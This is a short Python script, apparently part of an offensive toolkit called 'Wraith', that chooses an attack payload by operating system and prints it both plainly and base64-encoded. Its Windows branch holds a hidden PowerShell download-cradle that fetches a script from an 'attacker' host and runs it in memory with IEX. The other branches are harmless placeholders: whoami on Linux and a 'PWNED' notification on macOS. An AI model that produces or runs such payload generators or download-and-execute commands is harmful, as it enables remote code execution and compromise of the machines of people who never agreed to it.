# wraith.py — Adaptive Payload Engineer
import os
import platform
import base64
from rich import print, panel

def generate_payload():
    os_type = platform.system()
    if os_type == "Linux":
        return "python3 -c 'import os; os.system(\"whoami\")'"
    elif os_type == "Windows":
        return "powershell -NoP -W Hidden -C \"(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1') | IEX\""
    elif os_type == "Darwin":
        return "osascript -e 'display notification \"PWNED\" with title \"Lune\"'"
    return "echo Unknown OS"

def run():
    print(panel.Panel("\U0001F47B [bold green]WRAITH[/bold green] — Adaptive Payload Logic"))
    cmd = generate_payload()
    print(f"[bold cyan]Generated Payload:[/bold cyan]\n{cmd}")
    print("[dim]Base64 encoded:[/dim]")
    print(base64.b64encode(cmd.encode()).decode())